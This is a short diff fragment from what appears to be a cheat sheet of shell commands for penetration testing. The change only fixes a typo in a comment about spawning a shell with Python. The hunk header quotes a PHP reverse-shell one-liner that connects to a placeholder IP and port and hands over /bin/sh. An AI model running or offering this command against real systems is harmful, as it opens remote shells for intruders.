@@ -482,7 +482,7 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 <br />
 
 ```bash
-# About: A command spawn a new shell using python
+# About: A command to spawn a new shell using python
 # Download: May or may not be installed on server machine
 
 # Usage 
